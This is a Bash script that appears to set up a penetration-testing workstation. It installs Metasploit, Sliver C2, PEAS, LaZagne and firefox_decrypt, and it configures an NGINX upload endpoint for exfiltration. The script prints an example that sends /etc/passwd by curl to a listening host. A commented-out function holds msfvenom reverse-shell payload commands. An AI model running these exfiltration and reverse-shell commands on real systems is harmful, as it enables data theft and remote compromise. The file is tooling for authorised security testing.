#!/bin/bash


dldir="$HOME/Downloads"
homedir="$HOME"
kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
RED='${RED}'
GREEN='${GREEN}'
BLUE='\033[0;34m'
NC=' ${NC}' # No Color


source bash_tools.txt


function nginx_config {
    # Used to create an NGINX proxy for apache for web exfiltration 
    sudo mkdir -p /var/www/uploads/Exfil
    sudo chown -R www-data:www-data /var/www/uploads/Exfil
    sudo cp ./upload.conf /etc/nginx/sites-available/upload.conf
    if [[ ! -e "/etc/nginx/sites-enabled/upload.conf" ]]; then
        sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
    fi
    sudo systemctl restart nginx.service
    sudo rm /etc/nginx/sites-enabled/default
    # Usage
    echo -e "${GREEN}NGINX has been setup. To test the upload, try:${NC}\n"
    echo -e "${GREEN}curl -T /etc/passwd http://<ip>:8443/Exfil/testfile.txt ; tail -n 1 /var/www/uploads/Exfil/testfile.txt ${NC}\n"
}


function msfdb_init {
    # TODO: Check and make sure the msfdb is actually up and running (msfdb run)
    sudo systemctl start postgresql
    systemctl status postgresql
    sudo msfdb init
    echo "MSF Database Initialized"
    echo "Creating msfconsole.rc file"
    cp "${kit_location}/msfconsole.rc" "${HOME}/.msf4/msfconsole.rc"
    echo -e "\nHere is the status of msfdb:\n"
    sudo msfdb status
}

function neo4j_init {
    # TODO: Grab the port/service information and present to the user
    sudo mkdir -p /usr/share/neo4j/logs
    sudo touch /usr/share/neo4j/logs/neo4j.log
    sudo neo4j start
    echo "Neo4j service initialized"
}

function peas_download {
    # For the time being - just scrub the PEAS directory and re-obtain
    if [[ -d "${dldir}/PEAS" ]]; then
        # Lol, risky
        sudo rm -rf "${dldir}/PEAS"
        grab_peas
    else
        grab_peas
    fi
}

function grab_peas {
    linpeas_sh='https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh'
    winpeas_bat='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat'
    winpeas_exe='https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe'
    sudo mkdir "${dldir}/PEAS"
    sudo wget -qO "${dldir}/PEAS/linpeas.sh" "${linpeas_sh}"
    sudo chmod +x "${dldir}/PEAS/linpeas.sh"
    sudo wget -qO "${dldir}/PEAS/winpeas.bat" "${winpeas_bat}"
    sudo wget -qO "${dldir}/PEAS/winpeas.exe" "${winpeas_exe}"
}


tool_install() {
    cd "$dldir"
    structure_setup
    
    # Temp method to grab lazagne and the old firefox decrypt for python2
    lazagne_exe='https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe'
    sudo wget "$lazagne_exe" -qO "$dldir/lazagne.exe"
    
    ff_decrypt_old='https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip'
    sudo wget "$ff_decrypt_old" -qO "$dldir/FirefoxDecrypt_ForPython2"
    
    # End temp method
    
    is_repo_installed() {
        if [[ "$1" =~ https://.+/(.+)\.git ]]; then
            if [[ -d "./${BASH_REMATCH[1]}" ]]; then
                return 0
            fi
        else
            echo -e "${RED}INVALID URL: $1 ${NC}"
            # Returning 0 here because if the url isn't valid, then we definitely don't want to try installing
            return 0
        fi
        return 1
    }
    
    for git_url in "${GITHUBS[@]}"; do
        echo "Checking for local install of: $git_url"
        if is_repo_installed "$git_url"; then
            echo -e "${GREEN}Found in current directory, continuing...\n ${NC}"
        else
            git clone "$git_url"
            echo -e "${GREEN}Repo cloned! Moving on... \n ${NC}"
        fi
    done
    
    # Begin installing pypi & apt packages
    apt_command_string="sudo /usr/bin/apt install "
    for pkg in "${APT_PACKAGES[@]}"; do
        apt_command_string+="$pkg "
    done
    
    apt_install_subproc=$(sudo /bin/bash -c "$apt_command_string" 2>&1)
    apt_return_code=$?
    
    if [ "$apt_return_code" -ne 0 ]; then
        echo -e "${RED}[!] apt encountered an error while running. Information follows ${NC}"
        echo -e "${RED}apt return code: $apt_return_code ${NC}"
        echo -e "\033[0;37mapt stdout:\n$apt_install_subproc ${NC}"
    else
        echo -e "${GREEN}[*] apt installed packages successfully ${NC}"
    fi
    
    for pkg in "${PYPI_PACKAGES[@]}"; do
        pip3 install "$pkg" 1>/dev/null
        echo -e "${GREEN}PYPI $pkg successfully installed by script ${NC}"
    done
    
    peas_download
    sudo ln -s "$dldir/nmapAutomator/nmapAutomator.sh" /usr/local/bin/ && sudo chmod +x "$dldir/nmapAutomator/nmapAutomator.sh"
    
    echo "tool_install() Completed"
    return 0
}


tool_update() {
    nmap_update() {
        echo "Updating nmap script database"
        sudo nmap --script-updatedb 1>/dev/null
        echo -e "${GREEN}nmap script database updated \n ${NC}"
    }

    rockyou() {
        echo "Checking if rockyou has been unzipped..."
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            echo "It hasn't been decompressed - decompressing now..."
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz
        else
            echo -e "${GREEN}rockyou has already been unzipped ${NC}"
            echo -e "${GREEN}Software & Tool updates have been completed! ${NC}"
        fi
    }

    echo "Updating searchsploit DB...."
    sudo searchsploit -u
    echo -e "${GREEN}Finished searchsploit update ${NC}"

    echo "Updating locate DB..."
    sudo updatedb
    echo -e "${GREEN}Finished locate DB update ${NC}"

    nmap_update
    rockyou

    return 0
}


c2_sliver_install() {
    # variable used for saving files
    c2_sliver_download_directory="$dldir/C2Frameworks"

    echo -e "${GREEN}[*] sliver: Installing sliver... ${NC}"

    # Try to install mingw-w64 package for more advanced features
    echo -e "${GREEN}[*] sliver: Installing mingw-w64 through apt ${NC}"
    sudo apt install -y mingw-w64 2>/dev/null 1>/dev/null

    # Clone source repo
    echo -e "${GREEN}[*] sliver: Cloning source and Wiki repos to $c2_sliver_download_directory ${NC}"
    git clone --quiet https://github.com/BishopFox/sliver.git "$c2_sliver_download_directory/sliver.git" 2>/dev/null >/dev/null
    # Wiki for documentation reference
    git clone --quiet https://github.com/BishopFox/sliver.wiki.git "$c2_sliver_download_directory/sliver.wiki.git" 2>/dev/null >/dev/null

    # Binary releases
    echo -e "${GREEN}[*] sliver: Downloading latest pre-compiled binary releases ${NC}"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -qP "$c2_sliver_download_directory"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux -qP "$c2_sliver_download_directory"
    wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_windows.exe -qP "$c2_sliver_download_directory"

    echo -e "${GREEN}[*] sliver: Installation complete. ${NC}"
    return 0
}

hostfilereset() {
    echo "127.0.0.1 localhost
127.0.1.1   kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters" > /etc/hosts
}

structure_setup () {
    DIRS=("Linux" "Windows" "ActiveDirectory" "C2Frameworks" "Packages")
    for dir in "${DIRS[@]}"; do
        if [[ -d "${dldir}/${dir}" ]]; then
            echo "${dir} FOLDER EXISTS"
        else
            mkdir "${dldir}/${dir}"
            echo "created the ${dir} directory"
        fi
    done
}


sublime_install() {
    sublime='https://download.sublimetext.com/sublime-text_build-3211_amd64.deb'
    wget -qO "${dldir}/sublime.deb" "${sublime}"
    sudo dpkg -i "${dldir}/sublime.deb"
}

vscodium_install() {
    # Download the public GPG key for the repo and package if hasn't been downloaded already
    if [ ! -f '/usr/share/keyrings/vscodium-archive-keyring.gpg' ]; then
        echo -e "${GREEN} [*] Adding VSCodium GPG key to filesystem (within /usr/share/keyrings/)${NC}"
        wget -qO - https://gitlab.com/paulcarroty/vscodium-deb-rpm-repo/raw/master/pub.gpg | gpg --dearmor | sudo dd of=/usr/share/keyrings/vscodium-archive-keyring.gpg 2>/dev/null
    else
        echo -e "${GREEN} [*] VSCodium GPG key already downloaded${NC}"
    fi

    # Add the repository if it hasn't been already
    if [ ! -f '/etc/apt/sources.list.d/vscodium.list' ]; then
        echo -e "${GREEN} [*] Adding VSCodium repository to apt repos in /etc/apt/sources.list.d/${NC}"
        echo 'deb [ signed-by=/usr/share/keyrings/vscodium-archive-keyring.gpg ] https://paulcarroty.gitlab.io/vscodium-deb-rpm-repo/debs vscodium main' | sudo tee /etc/apt/sources.list.d/vscodium.list 1>/dev/null
    else
        echo -e "${GREEN} [*] VSCodium repository already added${NC}"
    fi

    # Refresh available packages and install codium
    echo -e "${GREEN} [*] Installing VSCodium from repository${NC}"
    sudo apt update 2>/dev/null 1>/dev/null && sudo apt install codium -y 2>/dev/null 1>/dev/null
    echo -e "${GREEN} [*] VSCodium installed${NC}"
}


system_update() {
    echo -e "${BLUE}Beginning System updates, please wait...${NC}"
    sublime_install
    vscodium_install
    tool_install
    tool_update
    sudo apt install python3-pip -y
    sudo apt update -y
    sudo apt upgrade -y
    sudo apt autoremove -y

    echo -e "${BLUE}Starting SSH service ...${NC}"
    sudo service ssh start

    echo -e "${GREEN}Finished SYSTEM setup${NC}"
}

#Throw test cases into here, invoke with -test
function test {
    echo $(whoami) # The current user
    echo "Kit.py Location: $kit_location"
    echo $(sudo whoami) # This returns as root (since it's run as sudo)
    echo "Test Completed"
}

function jon {
    echo "Doing some work, here's a nice portrait, circa 2022 \n"
    echo "   -    \\\\O"
    echo "  -     /\\  "
    echo " -   __/\\ \`"
    echo "    \`    \\\\, (o)"
    echo "^^^^^^^^^^^\`^^^^^^^^"
    echo "Ol' Jon, kickin' them rocks again \n"
}

##### FUNCTION PURGATORY #####
## HERE LIES UNTESTED AND CURRENTLY UNUSED FUNCTIONS ##

silence_pcbeep () { # I stop the ridiculous terminal beeping !
    echo -e "blacklist pcspkr" > /etc/modprobe.d/nobeep.conf
    echo -e "\n  ${GREEN} Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \n"
    }

shell_creation() {
  # This grabs the IP address of tun0 and uses it to start generating malicious binaries
  ## TODO: Create a method to select what interface you want to use
  # ip_addr=$(ip addr show tun0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # This port is used for malicious binary generation
  # listen_port=6969
  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
  # listen_port=6969
  echo "Interface address is: $ip_addr"
  echo "Port being used for shells is $listen_port"
  echo "                           Nice"
  # msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
  # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
  echo "Did I work? doubtful!"
}


###################